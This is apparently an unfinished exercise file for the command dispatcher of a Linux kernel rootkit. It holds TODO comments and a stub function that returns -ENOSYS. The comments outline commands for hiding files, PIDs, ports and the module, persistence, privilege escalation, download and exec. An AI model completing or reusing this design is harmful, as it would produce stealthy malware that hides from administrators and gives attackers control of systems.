// SPDX-License-Identifier: GPL-2.0
//
// Command dispatch: table-driven with function pointers.
//
// One table scan, one indirect call. The dispatch table maps command
// prefixes to handler functions with the uniform rk_handler_t signature.
//
#include <linux/kernel.h>
#include <linux/string.h>

#include "rootkit.h"

struct rk_cmd_entry {
	const char	*prefix;
	rk_handler_t	handler;
	bool		exact;
};

// TODO: Write wrapper functions for handlers that do not use the arg
// parameter (ping, info, status, unhide_all, hide/unhide module,
// persist, unpersist, escalate). Each wrapper has the rk_handler_t
// signature and calls the real handler ignoring the arg.

// TODO: Write wrapper functions that bind target lists into the
// uniform signature (hide_file -> rk_cmd_hide_target with rk_file_targets,
// hide_pid, hide_content, unhide_file, unhide_pid, unhide_content).

// TODO: Build the cmd_table[] array with entries for all commands:
// Exact match: PING, INFO, STATUS, UNHIDE ALL, HIDE MODULE,
//   UNHIDE MODULE, PERSIST, UNPERSIST, ESCALATE
// Prefix match (exact=false): HIDE FILE, HIDE PID, HIDE CONTENT,
//   HIDE PORT, UNHIDE FILE, UNHIDE PID, UNHIDE CONTENT, UNHIDE PORT,
//   LIST, DOWNLOAD, EXEC

int rk_dispatch(struct rk_session *s, char *cmd)
{
	// TODO:
	// 1. Strip trailing newline
	// 2. Scan cmd_table: for exact entries, strcmp;
	//    for prefix entries, strncmp then pass cmd + prefix_len as arg
	// 3. Call matching handler
	// 4. If no match: RK_REPLY(s, "unknown command\n")
	return -ENOSYS;
}
